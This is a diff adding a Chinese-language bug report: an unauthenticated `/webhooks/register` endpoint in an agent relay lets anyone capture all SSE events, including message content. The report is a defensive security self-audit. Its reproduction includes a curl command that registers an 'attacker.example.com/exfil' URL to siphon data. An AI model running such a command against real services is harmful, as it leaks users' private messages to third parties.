@@ -1035,3 +1035,38 @@ pytest tests/test_reconnect.py -v
 - GR3：离线队列 — 断开 → 对方发消息 → 重连 → 验证消息缓冲
 
 **Commit**：`_start_relay` 部分修复已在 test_reconnect.py 中（待提交）
+
+---
+
+### BUG-039 🔴 P1 — `/webhooks/register` 无需认证，任意客户端可注册 webhook 接收所有 SSE 事件
+
+**发现**：2026-03-28 安全自查（心跳研究轮发现 A2A Issue #1681 同类问题）
+**优先级**：P1（安全漏洞，可导致消息内容泄露给第三方）
+**状态**：🔴 未修复
+
+**复现**：
+```bash
+# 任意客户端无需凭证即可注册 webhook
+curl -s -X POST http://localhost:7901/webhooks/register \
+  -H "Content-Type: application/json" \
+  -d '{"url": "https://attacker.example.com/exfil"}'
+# 之后所有 SSE 事件（包括消息内容）都会被推送到攻击者 URL
+```
+
+**根因**：
+`/webhooks/register` 和 `/webhooks/deregister` 路由没有任何认证检查。`_push_webhooks` 列表对所有 HTTP 请求开放写入。`_deliver_push()` 会将完整的 SSE 事件 body（含消息内容）POST 到所有注册的 URL。
+
+**影响范围**：
+- 消息内容泄露（`message` 事件携带完整 parts）
+- 连接状态泄露（`peer` 事件携带 peer_id、agent_card）
+- 仅限本地监听时（`--http-host 127.0.0.1`）风险可控；公网暴露时为高危
+
+**修复方案**：
+选项 A（推荐）：注册 webhook 时需提供 `--secret` 生成的 HMAC token 作为认证：
+```json
+{"url": "https://...", "auth_token": "<hmac_token>"}
+```
+选项 B：webhook 功能仅在 `--secret` 启用时可用，否则返回 403；
+选项 C：添加 `--allow-webhooks` 显式开关，默认关闭。
+
+**Commit**：待修复（下一个修复轮）
